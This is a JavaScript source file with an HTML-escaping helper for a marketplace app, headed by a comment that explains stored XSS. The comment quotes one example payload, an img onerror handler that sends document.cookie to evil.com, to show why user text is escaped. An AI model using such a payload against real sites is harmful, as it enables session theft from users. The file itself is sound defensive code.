// ============================================================================
// DesiMarket — HTML escaping helper (XSS prevention).
//
// THE PROBLEM: this app renders a lot of user-typed text (product names,
// descriptions, shop names, chat messages, reviews, questions, addresses,
// dispute messages, etc.) directly into the page using innerHTML template
// strings, e.g.  `<div>${product.name}</div>`.
//
// If a seller types a product name like:
//   <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
// ...then EVERY buyer who views that product would silently run that
// script in their browser. This is called a "stored XSS" attack, and it's
// exactly as dangerous as it sounds — it can steal session data, redirect
// users to phishing pages, silently place orders, deface pages, etc. It
// works on *any* free-text field: product name/description, shop name,
// city, chat messages, reviews, Q&A, dispute messages, delivery
// name/address, etc.
//
// THE FIX: never put raw user-typed text into innerHTML. Always run it
// through escapeHtml() first, e.g.  `<div>${escapeHtml(product.name)}</div>`
// This turns "<img src=x onerror=...>" into visible, inert text
// ("&lt;img src=x onerror=...&gt;") instead of letting the browser execute
// it as real HTML/JS.
//
// Fields that are NEVER user-typed (numbers, our own fixed labels, image
// URLs coming from a controlled upload flow) don't need escaping — only
// wrap fields a person could have typed into a form.
// ============================================================================

export function escapeHtml(value) {
    if (value === null || value === undefined) return '';
    return String(value)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}
